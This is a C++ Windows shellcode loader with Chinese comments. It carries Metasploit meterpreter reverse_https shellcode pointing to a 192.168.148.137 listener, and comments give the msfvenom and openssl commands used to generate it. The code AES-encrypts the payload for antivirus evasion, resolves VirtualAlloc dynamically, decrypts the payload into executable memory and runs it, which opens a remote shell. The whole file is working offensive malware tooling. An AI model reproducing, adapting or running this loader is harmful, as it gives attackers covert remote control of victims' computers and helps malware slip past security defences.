#include <windows.h>
#include "AES.h"
using namespace std;

typedef LPVOID(*MyVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
typedef LPVOID(*MyRtlMoveMemory)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source,SIZE_T  Length);
int main() {

	unsigned char key[] = { 0x01, 0x00, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0a, 0x0b, 0x0c }; //key example

	AES aes(AESKeyLength::AES_128);  ////128 - key length, can be 128, 192 or 256	
	/*
	reverse_https 
		# 1、生成证书

			openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=CH/ST=XX/L=XINJIANG/O=GW/CN=www.gw.com" -keyout gw.key -out gw.crt
			cat gw.key gw.crt > gw.pem
			rm -rf gw.key gw.crt

		# 2、生成shellcode

			msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.148.137 LPORT=8443 PayloadUUIDTracking=true PayloadUUIDName=gw HandlerSSLCert=./gw.pem StagerVerifySSLCert=true -f c
	*/
	unsigned char plain[] =
		"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
		"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
		"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78"
		"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3"
		"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
		"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
		"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
		"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
		"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
		"\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26"
		"\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\xe8\x78\x00\x00\x00"
		"\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x4d\x61"
		"\x63\x69\x6e\x74\x6f\x73\x68\x3b\x20\x49\x6e\x74\x65\x6c\x20"
		"\x4d\x61\x63\x20\x4f\x53\x20\x58\x20\x31\x32\x5f\x32\x5f\x31"
		"\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35"
		"\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c"
		"\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f"
		"\x6d\x65\x2f\x39\x38\x2e\x30\x2e\x34\x37\x35\x38\x2e\x38\x31"
		"\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00"
		"\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53\x68\xfb"
		"\x20\x00\x00\xe8\x21\x01\x00\x00\x2f\x43\x74\x6d\x6b\x41\x4f"
		"\x6f\x75\x59\x7a\x31\x61\x66\x46\x74\x39\x50\x71\x4b\x4b\x6c"
		"\x51\x56\x6e\x49\x47\x34\x5a\x41\x46\x49\x51\x75\x49\x53\x79"
		"\x33\x79\x4d\x67\x4f\x32\x69\x58\x67\x59\x77\x6e\x76\x31\x57"
		"\x4d\x65\x4a\x4b\x45\x66\x6c\x7a\x55\x78\x6c\x59\x74\x44\x4f"
		"\x33\x55\x46\x5a\x2d\x4d\x6c\x6f\x37\x61\x72\x53\x42\x48\x32"
		"\x6b\x5f\x76\x42\x5f\x76\x52\x47\x5f\x5a\x34\x66\x76\x6e\x6d"
		"\x6c\x75\x45\x5f\x57\x58\x33\x48\x70\x4b\x71\x37\x52\x52\x7a"
		"\x2d\x57\x74\x67\x38\x61\x57\x35\x6b\x63\x70\x54\x39\x67\x32"
		"\x50\x56\x4c\x36\x62\x66\x6e\x6d\x32\x59\x58\x63\x70\x6e\x56"
		"\x36\x4e\x39\x00\x50\x68\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53"
		"\x68\x00\x32\xe8\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e"
		"\x3b\xff\xd5\x96\x6a\x0a\x5f\x68\x80\x33\x00\x00\x89\xe0\x6a"
		"\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x53\x53\x53"
		"\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88"
		"\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75\xcd\xe8\x4c"
		"\x00\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00"
		"\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68"
		"\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0"
		"\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x6b"
		"\xff\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x34\x38\x2e"
		"\x31\x33\x37\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";


		// http msf
	//unsigned char plain[] =
		// 	"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
		//	"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		//	"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
		//	"\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
		//	"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18"
		//	"\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1"
		//	"\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
		//	"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
		//	"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
		//	"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
		//	"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
		//	"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
		//	"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x94\x89\x68\x02"
		//	"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
		//	"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
		//	"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
		//	"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
		//	"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
		//	"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
		//	"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
		//	"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
		//	"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
		//	"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
		//	"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
		//	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	/*
		AES加密,使用16个密钥加密生成16个密文，随便选一个用就行，加载解密的时候记得更新密钥
	*/
	
	unsigned int plainLen = 768 * sizeof(unsigned char);  // 768为shellcode长度
	unsigned mykey[16] = { 0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xa,0xb,0xc,0xd,0xe,0xf };
	unsigned char* c[16];
	for (int i = 0; i < 16; i++) {
		key[1] = mykey[i];
		 c[i] = aes.EncryptECB(plain, plainLen, key);
	}

	for (int j= 0;j<16;j++){
		key[1] = mykey[j];
		for (int z = 0; z < 16; z++) {
			printf("%02x,", key[z]);
		}
		printf("第%d加密密之后的结果:\n",&j);
		unsigned char * str = c[j];
		for (int i = 0; i < 768; i++) {
			printf("\\x%02x", str[i]);
		}
		printf("\n");
	}
	printf("\n");
	

	/*
		AES 解密，并运行
	*/
	//  http msf 368
	//unsigned char cipher[] = "\x4a\x31\x39\x0e\x5e\x6c\xb2\xf1\xa1\x69\xec\x35\xa6\x06\x42\x40\x8d\xce\x8b\xc7\x5c\xf0\xf0\xa9\xe6\x49\x26\x28\xc3\x05\xf1\xca\x00\x1e\x66\x2a\x97\x64\xd8\x4e\x33\x90\x85\x9c\x5b\x2c\x8a\x13\x97\x3a\x97\x0e\x69\x69\x84\x1e\x67\xa6\x96\x84\xac\x0a\xcc\x03\xe3\x9e\x4e\x55\xe1\xc9\xc4\x92\xf2\xf1\x31\xb1\xa2\x4d\x5a\xe4\x5e\xd7\x8f\xca\x25\x14\x93\xc6\xcd\xa1\x0c\x62\xad\x77\xa5\x5c\x3a\xfa\x24\xe7\xd7\x87\x32\x8d\xd7\xf9\x24\xb7\x55\x62\x8d\xae\x8e\x15\x42\x14\x8c\x0f\xa9\x6e\x11\x8e\xc6\xf0\xe2\x98\x28\x92\xa8\xf0\xb4\xc5\x00\x4a\xc6\x4c\xff\xa5\x78\xd3\xd0\x7c\xb8\x70\x38\x6e\xf7\x1c\x33\x6f\x6f\x79\xef\x29\xb6\x1a\x5a\xca\xdf\xba\xff\x42\xf6\x30\x77\x2a\xe8\x1e\x50\x77\x93\xa6\x2d\x74\xae\xd1\x0e\x92\x68\x94\x73\xbd\xb5\x8d\x98\xf5\x35\x0b\x68\xb0\x7e\x67\x2f\xf7\x3d\xd0\xe8\xa8\xb8\x75\x0d\x9c\xce\x7f\x6a\xcc\xa4\x81\xd7\x3c\x5e\x0d\x63\xb2\x15\x5b\x49\x17\x5f\x14\x55\xa9\x32\xc3\x8b\xa5\xd3\x22\x9b\x6b\x94\xda\x26\x5f\x1d\x79\x3a\x55\x4f\xda\x01\xa5\x99\x8c\x19\xd3\x60\x39\xd5\x83\xed\x9e\x43\x6a\x85\x96\xc5\x16\xf7\xdc\xf8\x6d\x35\x1e\xf6\x1b\x8f\xfe\x57\xeb\xfb\xe9\xbe\x72\x9d\xe6\x13\x5b\xec\xe9\x47\xe5\x05\xc2\xe5\x3b\xb4\xef\x53\xa0\x34\xab\x3f\x52\x8c\x9a\x91\x44\xf8\x70\xec\x24\x43\x6c\xf4\x1b\x91\xc3\x40\xd0\xaa\x64\xc9\xeb\x2f\x56\xa8\x06\x83\x96\x8a\xdf\xe2\x42\x05\x87\x56\x9b\xa9\x9a\xd5\xc9\xcd\x9e\x2a\x3c\x5d\xfc\x04\x79\x45\xbb\x6f\x0b\x5a\x12\xc2\xdd\x5f\x52\xb4\x2e\x74\x5e\x91\x72\x68\x9c\x0c\xce\x24\xc7\xdb\x50\x77\x74\x1a\xf4";

	 //https  msf 768
	//unsigned char cipher[] = "\xe2\x58\x8c\x49\xb7\xa2\x9d\x55\x3c\x0d\xfd\x97\x31\x86\x98\xc5\x35\x58\xe4\x10\xf6\x3b\x7e\xdc\x6a\xa5\xb9\x63\xd2\xca\x9a\xf9\xf9\xf1\x3e\xf1\x4d\x6f\x97\xb7\x31\x8e\x96\x5e\xa7\x19\xcf\x7a\xc7\xe6\xe7\xc0\x81\x38\x6b\xcb\xfd\x22\xab\xbc\x50\x47\x82\xcc\xe7\x09\x1a\x3a\x03\x1e\x9e\x36\xaf\x5e\xd9\x66\x72\x1d\x40\xa8\x12\x2d\x33\x63\x4d\x8b\x62\x0b\xdc\x73\xc8\x48\x32\xc5\xd3\x7d\x1e\x72\xed\xd9\x32\x43\x55\xad\xec\x11\x8b\x62\xb4\xb4\xb6\x69\x62\x0c\x96\x57\x5f\x51\xcf\x0e\x15\x24\x74\x08\xa4\x99\x88\x9f\x4b\xde\xaa\x85\x13\xaf\x12\x5e\x2c\x27\x49\x8b\x7e\xd1\xdb\x0e\x80\x6f\x94\xf7\x03\x6b\x5e\x25\xf7\xe3\x7d\x36\x57\x1d\xe9\x40\x47\xb0\xb9\xf0\xab\xc9\x76\x54\x7a\x29\x7a\x38\x4e\x63\x65\x51\xd4\x45\x93\xae\x65\x5a\xc3\x64\x63\xc0\x85\x05\xe7\x07\x31\x63\xb0\xb9\x30\x02\x55\x78\xb1\xbc\xb9\x66\x24\x5b\xb6\xa8\xbd\x2d\x7a\x06\x8b\xef\xb5\x8c\x01\xe5\x91\x03\x63\xb6\x9e\xd0\x0e\xd2\x40\x3e\x0a\x2c\x47\xb9\x46\xc1\x06\x60\x12\x19\x94\x00\xd9\xd3\x14\x9b\x8c\x1a\xcc\xa3\x97\xe0\x00\x5b\xb9\x98\x07\x65\xfc\xb8\x21\x77\x88\x0d\xfc\x67\x4b\x6a\xaf\x08\x38\x4f\xd7\x62\x9c\x31\x84\x97\x29\x49\x4e\x36\x0d\x3f\x55\x35\xb8\x34\x54\xf5\xb4\x66\x59\xa0\xdc\x22\x4e\xf1\xfd\xde\x62\xa3\xdd\x48\xfa\x82\x07\x06\xf4\xbb\xf4\x9b\x34\xac\xf5\xc1\x7f\xfd\xb1\x9d\x7f\x36\x93\xf7\x14\x62\xdf\x97\x03\xb1\x01\x16\x3f\x63\x1c\xeb\x16\x32\x1a\x4f\xc1\x53\xd5\x58\x2f\x02\x3d\xbe\x20\x40\x2f\xc2\xe1\xbd\xad\xb9\x34\xbb\xec\x4d\xd6\xf0\x1f\x02\xa6\x3d\x09\x0d\x64\x40\x71\x46\x6b\x39\x14\x21\xc9\x66\xbe\x2a\x20\x1f\xab\x31\xfa\x34\xe5\x68\xc6\x70\x8b\x09\x81\xab\xa4\xa9\xed\x6c\x72\xa4\x7a\x3d\x4e\x6a\xaa\xd2\xe4\x36\xdf\xe2\x55\x0a\x54\x52\xce\xe6\x9b\xf9\x7b\x7e\x21\x35\x45\xbf\xe8\x88\x31\x2c\x94\xaa\x75\x9f\xc1\x6a\xcb\x06\x9f\x52\x20\x74\x58\xc5\xef\xa2\xcb\x48\xa4\x51\xa5\xac\xae\x41\x03\x43\xff\x57\x65\xd3\x50\x3a\xc8\x99\xf6\x46\x0e\x0c\xb3\xe7\xda\x02\xab\x34\x62\xc7\x0b\xc8\xbb\x5b\x96\x1b\x17\xdc\xed\x44\xfa\x8d\x1e\x97\xba\x8f\x31\xca\x24\xe7\x5c\x0e\x55\xfb\x2d\xac\x7f\x26\x10\x32\x86\xbf\x55\x33\x5b\x1b\x8f\xfa\xf1\x85\x02\xa3\x09\x4e\xb9\xbd\xbf\x07\xfe\xcd\xac\x8a\x18\xa6\x6a\xe2\x37\xf9\x0c\x9c\xc7\xb9\x44\x55\x16\xf1\x16\xf3\xb8\x8b\x3b\x14\xad\x6e\x3a\x64\x87\x97\x43\x7c\xa4\x6e\x70\x3b\xfb\x05\x21\xfa\x26\x92\xbf\x94\x19\x32\x17\x74\x78\xd6\x0a\xcf\x55\x7a\x5e\x22\xb7\xc0\xb8\x1d\xfc\x97\x5d\x24\x5e\x1a\xb1\xe5\x6a\xb7\x3e\x82\xf6\xa5\xb6\xb5\x01\x09\x10\x72\xd2\x77\x8b\xa2\xc6\x3a\x82\x19\x52\x00\x84\xb7\xe2\xfc\xe2\x1e\xfd\x58\x88\xc9\x57\x0d\xf7\x0e\xc3\xfc\xc5\xad\x5b\xdb\xab\xf1\x85\x4e\x0f\xb6\x67\xbf\x26\xbc\x1f\x2a\x0a\xd8\xe8\xac\x7b\xe6\x67\x5d\x1f\xaa\x40\x4c\xa6\x98\x87\x09\x16\x60\xc7\x8a\xa1\x89\x2d\xd6\xfd\xa2\x3a\x71\xcc\x42\xad\xf4\x9e\x0d\x3c\x2c\x04\xe0\xf3\x38\xe3\xb9\x42\xbe\xe1\xab\x96\xe1\x03\x2c\x24\x02\x45\x2e\x01\xf4\xbf\x1b\xd7\x17\x8c\xf1\x78\x92\x1d\xa9\x1e\x54\x1c\x3e\x76\xbd\x54\xe6\x20\x51\x8c\x55\x67\x15\xce\x79\xa4\xbe\x54\xf9\x91\xb8\x16\xc9\x63\x5c\x42\xc8\xd1\xfb\x4a\xbe\x6e\x33\x94\xee\xf7\x3a\x7d\xc1\x3c\x97\xcf\x83\xdf\xdf\xd5\x2a\xeb\x39\x1a\xc4\xeb\x82\x72\xf5\xa4\xfb\xfd\xe6\x76\x44";
	unsigned char cipher[] = "\xdb\x28\xc9\xb9\xce\xed\x04\x61\x26\x8d\xcb\x2c\x7a\x7c\x29\x7b\xb3\x79\x55\x70\x86\x6d\xa1\x69\x04\x14\xaa\x0d\x2d\x80\x49\xf5\x16\x8c\x10\xb2\x3e\x7e\xa1\x62\x37\xe7\x77\xc2\x95\x2f\x50\xa4\xc6\xa8\xae\x12\x2d\xbe\xe5\xcf\x6d\xca\x68\xb7\xc1\x56\x22\x58\xec\x64\x93\xd8\x5a\xa3\x99\xc5\x67\xa1\x72\x13\x15\x44\xb3\x1f\x98\x5a\xed\x6e\xc9\x0b\x0e\xc2\xe5\x06\x3b\x8f\xfc\xdc\x8d\x5f\x04\x62\x47\x17\x31\xa2\xc2\xc5\xdb\xe3\xc6\x57\x10\x3b\xe1\x9c\x58\xcd\xae\x45\x86\xcf\x34\x24\xdf\x66\x22\xb4\xfd\xfb\x2a\x1d\xcb\xb3\x80\x00\x66\xac\x9e\xf1\xc9\x0f\x5e\xee\xed\xea\xf0\xce\xeb\xf0\x96\xfe\x7e\xd2\xf2\xae\x4f\xf8\xf2\x93\xbb\x0a\x75\x1e\x34\xad\x72\xf4\x49\x33\xef\x4b\x8a\xad\x80\x31\x1c\x46\xe5\xca\xbf\x2b\xc0\x6d\x9b\xa8\x71\xdc\xd4\x6f\xdd\x0a\x0f\xe7\x62\x56\x10\xeb\x2f\x2d\x6f\x3d\x90\x00\x66\x5f\x5e\x5f\xb3\xf6\x34\xeb\x77\x1a\xa7\x85\xb9\xfc\xe8\xd1\x2b\x07\x9a\x62\xab\x65\xed\x97\xcf\xc3\x20\xa2\xe9\x2b\x49\x70\xcf\x2b\x3f\x8b\xaa\x5b\x0b\xbd\xcd\x90\x7f\x63\xe6\xf8\x52\xa6\x20\xb9\xca\x6a\xc2\x4d\xbb\x63\x64\xd1\x91\x6d\x8a\xd4\xc6\x01\x23\xa9\x9b\xe9\x9b\xef\x91\x83\x75\x8a\x17\x95\x0f\x10\xc5\xd4\x13\xf6\x6e\xc6\xab\xee\x05\x97\xb0\xa5\xdd\xd0\xb8\xdf\x32\x25\xfb\xda\x71\x2a\x16\x93\x88\x06\xce\x9b\x0f\x4f\xec\x9b\x98\xcc\x06\x65\xb0\x9c\x85\x1f\xda\x4e\x37\x19\xae\xad\xaa\xd4\x7f\xa8\xaf\xde\x2b\xa0\xb9\x18\x27\xcb\xcd\xe3\x3e\x27\xc7\x6a\x20\xbe\xf1\x37\xb2\xec\x36\x89\xd6\xc6\xa5\x4c\x49\x24\xc5\x0d\xe9\xde\x3d\xec\x3d\xcc\x1c\xf9\xdb\x38\x05\x53\xee\x00\x64\x69\x19\x5b\xad\x56\x7b\x53\xae\x55\x14\x1b\xdb\x43\xbc\xc2\x04\x46\xfc\x72\x30\x18\xdf\xb0\xfb\xcc\x27\x4b\xff\x4d\x8a\xcb\x38\x90\xa1\xe3\xb0\xac\x77\x03\xb0\x2a\x49\x23\x99\xdd\x6b\x90\x7e\x2c\xb3\x24\x4b\xb5\x6c\x63\x99\x80\x2c\xfe\x44\xb9\xc0\xe3\x2f\xaa\xbd\x4d\x3d\x68\x71\x08\x25\x44\x7d\xba\x1f\xb3\x4c\x52\xe7\x20\x7b\xbf\xe3\x96\xa3\x90\x60\x0b\xd7\xfd\x05\xd8\xc4\x86\x37\x5e\x08\x20\x75\xae\x1e\xaa\x20\x9e\x82\x2d\xe9\x3a\xd4\x8e\x2a\xc1\x76\x76\x9e\xb4\x47\xed\x15\xfe\x23\xdd\x7a\xb0\xcb\xfc\xda\x8b\xa7\xa3\xa6\xa1\x69\xd8\x34\xb7\x4d\x2d\x9c\x22\xf1\x72\x6e\xbf\x1f\xf6\x72\xf7\xf0\x75\x0f\x20\xfc\x39\xb2\x10\x20\x8b\xd4\xff\xd4\x2a\xa8\x11\x77\xd1\x0f\x74\xde\x91\xc1\x3f\x55\xb7\xa5\x98\x25\x2f\xb5\x41\x7f\x08\xcd\xd4\x3f\x95\xbf\xab\x0d\x26\xb7\x36\x58\x4b\x04\x7a\x86\x67\x8e\xe8\x84\xc1\x62\xdf\x6c\xf8\x17\x06\xf0\xbe\x8c\xde\x10\x07\x19\x22\xca\xaf\x9f\xe5\xde\x2b\x7e\x76\x76\xd3\x67\xbf\x90\x57\xce\x23\xd3\xb4\xdc\x26\x0b\x8b\xc9\x67\x95\xc3\x2c\xa4\x09\x0b\x20\x1f\x32\x82\xf8\xcd\x45\x5d\xf3\xaf\x2d\x22\xf6\xef\xb1\xd8\xc7\x24\x95\xc7\xd0\xf4\x29\x79\xaa\x8e\xc7\x0f\xf8\x55\x61\x06\xee\xaf\x85\x9c\x16\x95\x69\x18\xe3\x3c\xd6\x22\x6a\x05\x06\x1f\x3e\x52\x61\xc8\x8e\x3b\x27\x00\x53\x5c\x41\x36\xf9\x9a\x01\x01\x03\xc5\xca\xdc\x66\xf0\xf0\xb3\x7d\xba\x17\xf8\xad\x70\x7c\xd6\xdf\x33\xff\x06\xff\xe5\xba\xb2\xe0\x53\xbd\xa3\x14\x14\x68\xce\xb7\xe1\x6a\xae\x31\x8d\xc2\x95\xb9\x7b\x36\x41\xbe\x0b\x49\xc6\xcf\xda\x09\xef\x83\x12\x1a\xe7\xb4\x0f\x43\x5a\xf0\xd3\x5a\x5c\xb5\x29\x2e\xf6\x6c\xd7\xb5\x02\x94\xcf\xb4\xc8\x34\xf8\xa1\x8c\x58\x43\xb5\x36";
	unsigned int cipherLen = 768 * sizeof(unsigned char);  //bytes in plaintext
	//AES aes(AESKeyLength::AES_128);  ////128 - key length, can be 128, 192 or 256
	unsigned char* p = aes.DecryptECB(cipher, cipherLen, key);
	//printf("解密之后的结果:\n");
	//for (int i = 0; i < 768; i++) {
	//	printf("\\x%02x", *(p + i));
	//}
	MyVirtualAlloc myVa= (MyVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	LPVOID mem = myVa(NULL, 768, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(mem, p, 368);

	//LPVOID mem = VirtualAlloc(NULL, 768, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//memcpy(mem, p, 368);
	RtlMoveMemory(mem, p, 768);
	((void(*)())mem)();
	return 0;
}